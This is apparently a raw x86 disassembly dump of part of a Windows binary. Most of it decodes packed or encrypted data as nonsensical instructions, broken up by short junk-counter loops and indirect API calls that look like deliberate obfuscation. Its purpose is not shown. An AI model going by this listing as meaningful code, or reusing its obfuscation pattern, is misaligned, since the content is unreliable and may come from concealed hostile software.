  40e179:	ins    BYTE PTR es:[edi],dx
  40e17a:	add    eax,0xac8455b6
  40e17f:	into   
  40e180:	sbb    al,0xe8
  40e182:	ret    0x5b94
  40e185:	mov    dl,0x37
  40e187:	sub    dh,BYTE PTR [esi]
  40e189:	xor    al,0xb7
  40e18b:	clc    
  40e18c:	sub    DWORD PTR [esi+0x18ba9579],edx
  40e192:	cli    
  40e193:	sbb    ebx,DWORD PTR [eax]
  40e195:	mov    BYTE PTR [esi],ah
  40e197:	inc    ebp
  40e198:	pop    ecx
  40e199:	ja     0x40e198
  40e19b:	push   esi
  40e19c:	jle    0x40e1a2
  40e19e:	inc    ecx
  40e19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a0:	shl    DWORD PTR [esi],0x16
  40e1a3:	std    
  40e1a4:	inc    esp
  40e1a5:	fimul  WORD PTR [edi]
  40e1a7:	lds    eax,FWORD PTR [esi]
  40e1a9:	jle    0x40e158
  40e1ab:	mov    ecx,0x9a10bdb7
  40e1b0:	sbb    ebp,DWORD PTR [ebp-0x616b4c37]
  40e1b6:	scas   eax,DWORD PTR es:[edi]
  40e1b7:	jle    0x40e173
  40e1b9:	add    eax,0x51c55233
  40e1be:	adc    BYTE PTR [eax],dh
  40e1c0:	cwde   
  40e1c1:	data16 cmp al,0x1d
  40e1c4:	and    BYTE PTR [ebp+eiz*2-0x39],ah
  40e1c8:	outs   dx,DWORD PTR ds:[esi]
  40e1c9:	mov    DWORD PTR [esi-0x4ffb6ed2],edx
  40e1cf:	scas   al,BYTE PTR es:[edi]
  40e1d0:	jg     0x40e230
  40e1d2:	push   0x9a5a44d5
  40e1d7:	int3   
  40e1d8:	(bad)  
  40e1d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1da:	call   0x16eff723
  40e1df:	fld    QWORD PTR [eax+eiz*2-0x3]
  40e1e3:	stc    
  40e1e4:	pop    esi
  40e1e5:	push   esi
  40e1e6:	scas   al,BYTE PTR es:[edi]
  40e1e7:	ds repnz dec esi
  40e1ea:	lds    edi,FWORD PTR [edi*1+0x686c655c]
  40e1f1:	xchg   edi,eax
  40e1f2:	stos   BYTE PTR es:[edi],al
  40e1f3:	or     al,0xb7
  40e1f5:	(bad)  
  40e1f6:	fsubr  DWORD PTR ds:0xf8337f56
  40e1fc:	in     al,0xdb
  40e1fe:	pusha  
  40e1ff:	daa    
  40e200:	cmc    
  40e201:	(bad)  
  40e202:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e203:	xchg   esi,eax
  40e204:	out    dx,al
  40e205:	xor    al,0xde
  40e207:	daa    
  40e208:	jne    0x40e1ae
  40e20a:	(bad)  
  40e20b:	inc    BYTE PTR [ecx+esi*4]
  40e20e:	add    ebp,DWORD PTR gs:[ebp+0x118c57ad]
  40e215:	stos   BYTE PTR es:[edi],al
  40e216:	ss dec esp
  40e218:	jne    0x40e255
  40e21a:	sub    BYTE PTR [ebx],cl
  40e21c:	jbe    0x40e1b6
  40e21e:	(bad)  
  40e21f:	dec    edi
  40e220:	repnz imul ebx,DWORD PTR [eax-0x133635e3],0x60ef104
  40e22b:	es retf 
  40e22d:	push   ss
  40e22e:	push   0x7570470e
  40e233:	out    dx,eax
  40e234:	sbb    al,0xe5
  40e236:	jnp    0x40e2a1
  40e238:	or     al,0x82
  40e23a:	jns    0x40e234
  40e23c:	out    0x85,eax
  40e23e:	xchg   DWORD PTR ds:0xe4f279e3,esi
  40e244:	jge    0x40e1e5
  40e246:	call   0xb1474647
  40e24b:	pop    ebp
  40e24c:	mov    ds:0xbeb4fd57,al
  40e251:	lods   eax,DWORD PTR ds:[esi]
  40e252:	pop    es
  40e253:	mov    al,0xc4
  40e255:	xchg   BYTE PTR [ebp+0x41],bl
  40e258:	mov    al,0x4d
  40e25a:	mov    dh,0x58
  40e25c:	out    dx,al
  40e25d:	test   al,0x88
  40e25f:	enter  0x8cec,0x8a
  40e263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e264:	xchg   edi,eax
  40e265:	mov    bh,0xfc
  40e267:	mov    bl,0x58
  40e269:	cmp    BYTE PTR [eax-0x2f0f87cc],dh
  40e26f:	cmp    edx,esp
  40e271:	pop    ebp
  40e272:	mov    ebp,0x61e5f3d6
  40e277:	pop    ds
  40e278:	pop    esp
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	or     DWORD PTR [ebx],esi
  40e378:	mov    esp,0x70a43be0
  40e37d:	jo     0x40e342
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e35f
  40e383:	dec    ebx
  40e384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e385:	shl    BYTE PTR [ecx-0x1f617a1],cl
  40e38b:	out    dx,eax
  40e38c:	or     ebp,ebp
  40e38e:	mov    dl,0x78
  40e390:	push   0xffffffd3
  40e392:	iret   
  40e393:	sti    
  40e394:	cdq    
  40e395:	add    esp,esp
  40e397:	xchg   BYTE PTR [ebx+0x16],ch
  40e39a:	xchg   edi,eax
  40e39b:	sahf   
  40e39c:	dec    eax
  40e39d:	ds data16 jnp 0x40e37a
  40e3a1:	shl    dh,0xb8
  40e3a4:	mov    dh,0x55
  40e3a6:	cmc    
  40e3a7:	sbb    DWORD PTR [esi+ecx*1],esp
  40e3aa:	(bad)  
  40e3ab:	and    BYTE PTR [ecx],dl
  40e3ad:	aas    
  40e3ae:	hlt    
  40e3af:	dec    ecx
  40e3b0:	inc    ecx
  40e3b1:	shl    al,0x84
  40e3b4:	dec    esp
  40e3b5:	lds    edi,FWORD PTR [eax-0x16]
  40e3b8:	cmp    al,0x86
  40e3ba:	(bad)  
  40e3bb:	mov    dl,BYTE PTR [edi+0x1784175a]
  40e3c1:	or     esi,DWORD PTR [edx+0x7f]
  40e3c4:	sub    bh,ah
  40e3c6:	inc    ecx
  40e3c7:	rcr    BYTE PTR [esi+ebp*1+0x482c2139],cl
  40e3ce:	jae    0x40e3c7
  40e3d0:	sbb    al,0xbe
  40e3d2:	xlat   BYTE PTR ds:[ebx]
  40e3d3:	mov    ebx,0x643f8db4
  40e3d8:	mov    esi,0xc2694d3
  40e3dd:	jmp    0x7a30f28c
  40e3e2:	jno    0x40e3a7
  40e3e4:	hlt    
  40e3e5:	call   0xd1f21334
  40e3ea:	cmp    DWORD PTR [ebp-0x579d7c1f],0x2125fa48
  40e3f4:	in     al,0xe3
  40e3f6:	sbb    eax,0x92f6d230
  40e3fb:	iret   
  40e3fc:	clc    
  40e3fd:	in     al,dx
  40e3fe:	or     esi,0x23d4c649
  40e404:	xchg   ebp,eax
  40e405:	in     al,dx
  40e406:	fimul  DWORD PTR ss:[eax-0x3a17fd6f]
  40e40d:	jg     0x40e430
  40e40f:	and    ecx,DWORD PTR [ecx+0x1]
  40e412:	aaa    
  40e413:	pop    esp
  40e414:	(bad)  
  40e415:	push   ss
  40e416:	sbb    DWORD PTR [edi-0x10],ecx
  40e419:	fimul  WORD PTR [edi]
  40e41b:	mov    esi,0xe81438a7
  40e420:	adc    dl,al
  40e422:	sbb    eax,0x191e8c18
  40e427:	mov    ebp,0xf037e0be
  40e42c:	jb     0x40e3d7
  40e42e:	hlt    
  40e42f:	fld    st(2)
  40e431:	(bad)  
  40e432:	lahf   
  40e433:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e434:	sub    al,0x8f
  40e436:	call   0x58372dfb
  40e43b:	dec    eax
  40e43c:	hlt    
  40e43d:	push   0x15
  40e43f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e440:	and    BYTE PTR [ecx+eax*1+0x52],ch
  40e444:	adc    ecx,DWORD PTR [ebp-0xad0aecf]
  40e44a:	lahf   
  40e44b:	push   ss
  40e44c:	mov    esi,0x8b26d4d0
  40e451:	int3   
  40e452:	(bad)  
  40e454:	mov    edi,0x8d24ba8e
  40e459:	cmp    al,0xe6
  40e45b:	fild   QWORD PTR ds:0x50cac5e8
  40e461:	cmp    BYTE PTR [ecx+eiz*1-0x2],al
  40e465:	pop    esi
  40e466:	jns    0x40e45d
  40e468:	rol    DWORD PTR [ebx+0x64],1
  40e46b:	xor    dl,BYTE PTR [ebx-0x32]
  40e46e:	cmp    bh,ch
  40e470:	jmp    0x40e415
  40e472:	in     eax,0x73
  40e474:	jne    0x40e451
  40e476:	jecxz  0x40e499
  40e478:	(bad)  
  40e479:	mov    ecx,0x673f3a7f
  40e47e:	fwait
  40e47f:	repnz cs inc esp
  40e482:	outs   dx,DWORD PTR ds:[esi]
  40e483:	or     eax,0xe278a661
  40e488:	pusha  
  40e489:	out    dx,al
  40e48a:	cld    
  40e48b:	je     0x40e4a8
  40e48d:	add    BYTE PTR [esp+esi*8],dl
  40e490:	push   ds
  40e491:	dec    edi
  40e492:	das    
  40e493:	add    BYTE PTR [edx-0x2075d6a5],0x11
  40e49a:	into   
  40e49b:	xchg   edi,eax
  40e49c:	test   BYTE PTR [edx+eax*1+0x784d3fe3],0xf3
  40e4a4:	inc    edx
  40e4a5:	cs gs xor al,0x81
  40e4a9:	out    0xa1,eax
  40e4ab:	push   esp
  40e4ac:	stos   BYTE PTR es:[edi],al
  40e4ad:	cmp    eax,0x327ab02d
  40e4b2:	mov    ch,0x80
  40e4b4:	mov    ?,ebp
  40e4b6:	shl    esi,1
  40e4b8:	pop    edi
  40e4b9:	xchg   BYTE PTR [edx],ah
  40e4bb:	pushf  
  40e4bc:	dec    esp
  40e4bd:	fsub   st(7),st
  40e4bf:	mov    dh,dh
  40e4c1:	xor    bh,BYTE PTR ds:0x571b1fc9
  40e4c7:	jbe    0x40e544
  40e4c9:	das    
  40e4ca:	xor    DWORD PTR [edx],esp
  40e4cc:	outs   dx,BYTE PTR ss:[esi]
  40e4ce:	ret    
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x715f740f
  40e4f5:	fldenv [esi+0x7070a38e]
  40e4fb:	ret    
  40e4fc:	jg     0x40e56e
  40e4fe:	jo     0x40e4a6
  40e500:	push   0xfffffff2
  40e502:	inc    eax
  40e503:	pop    ebp
  40e504:	adc    al,0x42
  40e506:	mov    WORD PTR [bx],cs
  40e509:	jmp    0x16bb9fc4
  40e50e:	shl    bl,0x56
  40e511:	jle    0x40e581
  40e513:	sub    cl,dl
  40e515:	mov    ?,WORD PTR [ecx]
  40e517:	cmp    eax,0x5230c53d
  40e51c:	pop    ebx
  40e51d:	stos   DWORD PTR es:[edi],eax
  40e51e:	test   al,0xa9
  40e520:	mov    ch,0xc2
  40e522:	icebp  
  40e523:	in     al,0x2e
  40e525:	mov    eax,ds:0xa701515a
  40e52a:	mov    bl,0xb2
  40e52c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e52d:	test   edx,0x47b25d6b
  40e533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e534:	scas   al,BYTE PTR es:[edi]
  40e535:	add    edi,DWORD PTR [esi+eiz*1-0x167ffcbe]
  40e53c:	adc    esp,DWORD PTR [esi+0x67]
  40e53f:	fist   DWORD PTR [ebp-0x7546091f]
  40e545:	pop    edx
  40e546:	lods   al,BYTE PTR ds:[esi]
  40e547:	push   0xd7d681d6
  40e54c:	adc    ebp,edx
  40e54e:	jnp    0x40e4f5
  40e550:	stc    
  40e551:	mov    ebp,0xe22a07e4
  40e556:	fwait
  40e557:	cmp    esi,esp
  40e559:	push   ebp
  40e55a:	jae    0x40e5c7
  40e55c:	xor    DWORD PTR [ecx],esi
  40e55e:	push   ss
  40e55f:	mul    dl
  40e561:	xor    dl,BYTE PTR [ecx]
  40e563:	loopne 0x40e52d
  40e565:	stc    
  40e566:	adc    BYTE PTR [ebp+0x68],0x74
  40e56a:	adc    bl,BYTE PTR [edi+edi*1]
  40e56d:	push   eax
  40e56e:	daa    
  40e56f:	aam    0x34
  40e571:	mov    dl,0x4e
  40e573:	push   edi
  40e574:	or     eax,DWORD PTR [ebx-0x75]
  40e577:	sbb    DWORD PTR [ebx-0x20a88143],eax
  40e57d:	pop    esi
  40e57e:	imul   edx,DWORD PTR [edi],0x50
  40e581:	in     al,0x5b
  40e583:	mov    ecx,0x26b93f3
  40e588:	movhps xmm2,QWORD PTR [edi-0x7a80d276]
  40e58f:	jmp    0x4e0ac119
  40e594:	ret    0x88ae
  40e597:	pop    ds
  40e598:	inc    ebp
  40e599:	in     eax,0xd6
  40e59b:	sbb    al,0xed
  40e59d:	pop    esp
  40e59e:	mov    eax,ds:0xeb0d036
  40e5a3:	fcmovnb st,st(7)
  40e5a5:	pop    edi
  40e5a6:	imul   BYTE PTR [ebx]
  40e5a8:	add    eax,0xd6c69077
  40e5ad:	test   ebx,esp
  40e5af:	retf   0x43ae
  40e5b2:	dec    ecx
  40e5b3:	xchg   WORD PTR ds:0x17b0a943,bx
  40e5bb:	push   ds
  40e5bc:	mov    esp,0x885fbc56
  40e5c1:	call   0x3de6454c
  40e5c6:	cwde   
  40e5c7:	and    al,0x70
  40e5c9:	outs   dx,BYTE PTR ds:[esi]
  40e5ca:	sbb    esp,DWORD PTR [eax+0x377e9720]
  40e5d0:	das    
  40e5d1:	sbb    BYTE PTR es:[esi+eiz*1],bh
  40e5d5:	pop    ss
  40e5d6:	mov    eax,0xba17c879
  40e5db:	rcr    DWORD PTR [ebp+edi*4+0x1a],0x77
  40e5e0:	xchg   edi,eax
  40e5e1:	cmp    BYTE PTR [ebx],ah
  40e5e3:	adc    DWORD PTR [esi+0x3],ecx
  40e5e6:	mov    edi,0x272d3445
  40e5eb:	imul   esi,DWORD PTR [eax+0x4dc51dca],0x9a371742
  40e5f5:	xchg   DWORD PTR [ebx],esp
  40e5f7:	pop    eax
  40e5f8:	scas   eax,DWORD PTR es:[edi]
  40e5f9:	leave  
  40e5fa:	mov    eax,ds:0x68085a92
  40e5ff:	sub    BYTE PTR [ebp+0x2a060ab5],0xc1
  40e606:	ret    0x324e
  40e609:	xchg   edi,eax
  40e60a:	xchg   ebp,eax
  40e60b:	xor    ah,cl
  40e60d:	and    ecx,DWORD PTR [eax+0x68]
  40e610:	repz jns 0x40e663
  40e613:	xor    al,0xb7
  40e615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e616:	imul   ebx,DWORD PTR [ebx],0x6b
  40e619:	in     al,0xd4
  40e61b:	cmp    BYTE PTR [esi+0x42ec0414],bl
  40e621:	jp     0x40e632
  40e623:	or     BYTE PTR [ebx+0x1107d471],bl
  40e629:	sub    dh,BYTE PTR [ecx-0x4d]
  40e62c:	gs loopne 0x40e69a
  40e62f:	and    al,0x63
  40e631:	adc    eax,0x7f688046
  40e636:	in     al,0xe1
  40e638:	inc    esi
  40e639:	loopne 0x40e677
  40e63b:	mov    ah,0xd2
  40e63d:	cmp    eax,0x5c49367f
  40e642:	aam    0x87
  40e644:	mov    bh,0x5a
  40e646:	sub    ebp,DWORD PTR [ecx]
  40e648:	or     DWORD PTR [edi],edi
  40e64a:	daa    
  40e64b:	call   0x82292bdb
  40e650:	and    eax,0x42fd7a
  40e655:	add    BYTE PTR [eax],al
  40e657:	add    BYTE PTR [eax],al
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	cmc    
  40e6db:	(bad)  
  40e6dd:	mov    al,ds:0x7070a251
  40e6e2:	ret    
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e6c7
  40e6e7:	test   DWORD PTR [ecx],esp
  40e6e9:	and    BYTE PTR [esi-0x644c1e1c],0xc3
  40e6f0:	sbb    ebp,DWORD PTR [ebx-0x37]
  40e6f3:	mov    es,WORD PTR [edx+0x105f8709]
  40e6f9:	int3   
  40e6fa:	inc    edi
  40e6fb:	loop   0x40e6c5
  40e6fd:	test   eax,0x8a2407eb
  40e702:	setge  BYTE PTR [ebp-0x35]
  40e706:	jo     0x40e743
  40e708:	mov    ds:0xba97c317,eax
  40e70d:	in     al,dx
  40e70e:	(bad)  
  40e70f:	not    BYTE PTR ds:0xfe614f9c
  40e715:	shr    cl,0x90
  40e718:	hlt    
  40e719:	inc    ebx
  40e71a:	mov    al,ds:0x750b2935
  40e71f:	sbb    esi,DWORD PTR ds:0x4922cbfc
  40e725:	push   ss
  40e726:	(bad)  
  40e727:	mov    edx,0x6f8341b1
  40e72c:	xlat   BYTE PTR ds:[ebx]
  40e72d:	adc    DWORD PTR [ecx],0x79c77f62
  40e733:	push   esi
  40e734:	adc    ebp,ebp
  40e736:	xchg   ebx,eax
  40e737:	out    0xdf,al
  40e739:	retf   0x9254
  40e73c:	jmp    FWORD PTR [ecx-0x4]
  40e73f:	mov    ebp,0x8e2fe506
  40e744:	fiadd  WORD PTR [esi]
  40e746:	xchg   ecx,eax
  40e747:	mov    esi,0x4940f681
  40e74c:	xor    DWORD PTR [esi+0x362858b0],0x5b
  40e753:	stos   DWORD PTR es:[edi],eax
  40e754:	xor    al,bh
  40e756:	fwait
  40e757:	mov    ebp,fs
  40e759:	loopne 0x40e757
  40e75b:	jbe    0x40e7b4
  40e75d:	sbb    bl,BYTE PTR [edx]
  40e75f:	in     eax,0xd1
  40e761:	outs   dx,DWORD PTR ds:[esi]
  40e762:	push   ebx
  40e763:	pop    esp
  40e764:	sbb    esi,ebp
  40e766:	mov    bh,0x13
  40e768:	sbb    esp,DWORD PTR [edi+0x9a8b34e]
  40e76e:	mov    edx,0x1f7cb84c
  40e773:	sbb    ebx,DWORD PTR [edx+0x684ac924]
  40e779:	adc    edi,DWORD PTR [edx]
  40e77b:	pop    edi
  40e77c:	lock cmp cl,BYTE PTR ds:0xe66fa4d9
  40e783:	pop    ds
  40e784:	and    ecx,ebp
  40e786:	mov    ecx,0x54e5167f
  40e78b:	xor    DWORD PTR [edx-0x59],0xb3deb439
  40e792:	iret   
  40e793:	dec    eax
  40e794:	sub    bh,BYTE PTR ds:0x352b2351
  40e79a:	mov    ah,0x89
  40e79c:	rol    DWORD PTR [ebp+ebp*4-0x73f548f3],cl
  40e7a3:	sub    eax,0xaf6231b2
  40e7a8:	mov    cl,0x50
  40e7aa:	cdq    
  40e7ab:	push   esi
  40e7ac:	mov    ecx,0x58180e23
  40e7b1:	pop    es
  40e7b2:	out    0x12,al
  40e7b4:	push   esp
  40e7b5:	jge    0x40e7a9
  40e7b7:	aaa    
  40e7b8:	les    ecx,FWORD PTR [ecx+0x45]
  40e7bb:	mov    edx,0xf12d627b
  40e7c0:	xor    DWORD PTR [esi-0x40],edx
  40e7c3:	mov    bl,dh
  40e7c5:	and    al,0x6
  40e7c7:	in     al,dx
  40e7c8:	pop    eax
  40e7c9:	ret    0x2a59
  40e7cc:	add    al,0xc4
  40e7ce:	xor    DWORD PTR [edx-0x49],esp
  40e7d1:	fmul   QWORD PTR [esi-0x41f3ed5f]
  40e7d7:	cmp    BYTE PTR [ebp+0x17bcbf80],0xcd
  40e7de:	sbb    esi,edx
  40e7e0:	pushf  
  40e7e1:	call   0x54daf931
  40e7e6:	stc    
  40e7e7:	mov    ecx,0x236d8c59
  40e7ec:	mov    esi,eax
  40e7ee:	sti    
  40e7ef:	cmovbe eax,DWORD PTR [edi]
  40e7f2:	fdiv   DWORD PTR [eax-0x7c2f620e]
  40e7f8:	or     ecx,edi
  40e7fa:	mov    edx,0x2e7d93e
  40e7ff:	xor    dl,BYTE PTR [eax+0x4492b7ab]
  40e805:	enter  0x1c4f,0xe
  40e809:	jnp    0x40e86f
  40e80b:	stos   DWORD PTR es:[edi],eax
  40e80c:	jmp    0xab17:0xf094cf16
  40e813:	push   edx
  40e814:	jle    0x40e845
  40e816:	xchg   edx,eax
  40e817:	out    dx,eax
  40e818:	stos   BYTE PTR es:[edi],al
  40e819:	shl    DWORD PTR [ecx-0x511650aa],cl
  40e81f:	pop    ebx
  40e820:	call   0x2089:0x91974311
  40e827:	inc    esp
  40e828:	mov    ebx,0x10538728
  40e82d:	neg    DWORD PTR [ebx+0x33]
  40e830:	rcr    dl,0x22
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fcd1,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fcd1
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fcd1,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fcd1,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e1e7
  40e8ca:	call   DWORD PTR ds:0x42e47f
  40e8d0:	cmp    DWORD PTR ds:0x42fcd1,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fcd1
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fcd1,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fd8a
  40e8f8:	adc    DWORD PTR ds:0x42e6ff,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e6f7,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e6fb,0x42e6ef
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd01
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd0d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e70b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	jecxz  0x40e953
  40e94b:	and    DWORD PTR [esp-0x60],0x7fc37070
  40e953:	jo     0x40e9c5
  40e955:	outs   dx,BYTE PTR ds:[esi]
  40e956:	push   edx
  40e957:	fcomp  DWORD PTR [edx-0x4d]
  40e95a:	dec    DWORD PTR [edi-0x6849049b]
  40e960:	or     eax,0x56411edf
  40e965:	shr    BYTE PTR [ebx+0x5318e2ad],cl
  40e96b:	add    bh,BYTE PTR [eax+0x5bbbb11d]
  40e971:	push   ebx
  40e972:	and    DWORD PTR [ebx],edx
  40e974:	pop    ebx
  40e975:	mov    eax,ds:0x6767cc01
  40e97a:	pop    ss
  40e97b:	or     eax,0x52484c25
  40e980:	out    0x53,eax
  40e982:	rcr    ecx,cl
  40e984:	mov    ebx,0xf7c120dc
  40e989:	shl    DWORD PTR [ecx+0x1b54cf86],cl
  40e98f:	lds    ecx,FWORD PTR [esi]
  40e991:	mov    dl,0xfc
  40e993:	neg    DWORD PTR [edx-0x54]
  40e996:	imul   esp,DWORD PTR [esi-0x109d7e2c],0xd685082c
  40e9a0:	loope  0x40ea04
  40e9a2:	and    DWORD PTR [edi],edx
  40e9a4:	dec    ebp
  40e9a5:	push   es
  40e9a6:	mov    ch,0x26
  40e9a8:	push   ebp
  40e9a9:	cli    
  40e9aa:	push   edi
  40e9ab:	and    DWORD PTR [edx-0x6399e83],eax
  40e9b1:	xchg   esp,eax
  40e9b2:	rcl    al,1
  40e9b4:	or     ebx,DWORD PTR [esi-0x48473c1b]
  40e9ba:	add    edx,0xb79d7ae8
  40e9c0:	add    DWORD PTR [eax+0x700d668],esi
  40e9c6:	xor    bh,dl
  40e9c8:	sbb    eax,0x526ece81
  40e9cd:	cs in  al,dx
  40e9cf:	enter  0xaea9,0xcb
  40e9d3:	inc    ecx
  40e9d4:	int3   
  40e9d5:	push   ebx
  40e9d6:	in     eax,0xda
  40e9d8:	pop    esi
  40e9d9:	jns    0x40e9ab
  40e9db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9dc:	mov    BYTE PTR [edx],dh
  40e9de:	dec    edx
  40e9df:	mov    eax,0xdf63b43f
  40e9e4:	popf   
  40e9e5:	cmp    bl,BYTE PTR [esi-0x776b155d]
  40e9eb:	mov    esi,0x3161df36
  40e9f0:	ss data16 arpl sp,di
  40e9f4:	scas   al,BYTE PTR es:[edi]
  40e9f5:	mov    cl,ch
  40e9f7:	mov    esp,0xeebbdf39
  40e9fc:	adc    al,0x44
  40e9fe:	popa   
  40e9ff:	cld    
  40ea00:	enter  0xea89,0xbe
  40ea04:	mov    edx,0xd9e4b878
  40ea09:	popf   
  40ea0a:	or     al,0xcc
